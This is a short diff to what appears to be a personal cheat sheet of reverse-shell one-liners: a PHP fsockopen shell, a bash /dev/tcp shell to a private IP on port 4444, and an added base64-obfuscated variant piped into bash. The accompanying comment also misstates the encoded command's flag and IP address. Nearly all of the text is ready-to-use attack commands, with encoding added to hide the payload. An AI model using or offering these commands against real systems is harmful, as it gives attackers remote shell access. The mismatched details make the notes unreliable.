@@ -13,3 +13,13 @@ php -r ‘$sock=fsockopen("192.168.49.183",443);exec("/bin/sh -i <&3 >&3 2>&3");
 
 
 bash -c 'bash -i >& /dev/tcp/192.168.153.129/4444 0>&1'
+
+
+
+
+===================
+I used base64 encoder to encode my command(bash -c 'bash -i >& /dev/tcp/192.168.153.128/4444 0>&1')
+and then i echod the encrypted command as seen below:
+
+echo "YmFzaCAtSSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE1My4xMjkvNDQ0NCAwPiYxCg==" | base64 -d | bash
+===================
